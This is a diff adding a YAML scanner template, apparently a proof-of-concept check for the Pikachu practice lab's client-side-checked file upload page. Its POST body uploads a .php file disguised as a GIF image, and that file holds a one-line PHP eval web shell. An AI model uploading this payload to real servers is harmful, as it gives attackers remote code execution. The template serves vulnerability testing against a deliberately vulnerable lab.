@@ -1,0 +1,22 @@
+name: unsafe_fileupload-clientcheck-pikachu-post
+type: file upload
+rules:
+  - method: POST
+    path: vul/unsafeupload/clientcheck.php
+    headers:
+      Content-Type: multipart/form-data
+      boundary: ----WebKitFormBoundarycSgOn2pcer7xl6Dc
+    body: |
+      ------WebKitFormBoundarycSgOn2pcer7xl6Dc
+      Content-Disposition: form-data; name="uploadfile"; filename="gif89apwch4ser.php"
+      Content-Type: image/png
+
+      GIF89a
+      <?php eval($_POST[ch4ser]);?>
+      ------WebKitFormBoundarycSgOn2pcer7xl6Dc
+      Content-Disposition: form-data; name="submit"
+
+      寮�濮嬩笂浼�
+      ------WebKitFormBoundarycSgOn2pcer7xl6Dc--
+    expression: result.contains("gif89apwch4ser")
+author: ch4ser
